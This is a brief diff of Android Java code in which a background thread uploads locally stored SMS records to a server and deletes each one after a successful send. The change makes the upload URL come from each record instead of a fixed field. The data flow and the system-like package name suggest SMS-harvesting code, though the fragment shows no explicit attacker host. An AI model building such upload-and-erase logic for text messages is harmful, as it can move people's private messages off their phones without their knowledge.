@@ -3,7 +3,6 @@ package android.app.sms.async;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import android.app.sdk.SmsActivity;
 import android.app.sms.entity.SMSInfo;
 import android.app.sms.server.BaseService;
 import android.app.sms.sqlite.DQLiteOpenHelper;
@@ -29,7 +28,7 @@ public class SubmitDateThread extends Thread {
 				LogUtils.write("Send", "获取到本地数据库数据信息:size=" + smsInfos.size() + ",开始发送数据到服务器");
 				for (int i = 0; i < smsInfos.size(); i++) {
 					SMSInfo smsInfo = smsInfos.get(i);
-					boolean result = BaseService.sendData(this.context, SmsActivity.httpUrl, smsInfo);
+					boolean result = BaseService.sendData(this.context, smsInfo.getUrl(), smsInfo);
 					if (result) {
 						LogUtils.write("Send", "第" + (i + 1) + "条数据发送成功");
 						DQLiteOpenHelper.getHelper(this.context).deleteData(String.valueOf(smsInfo.getId()));
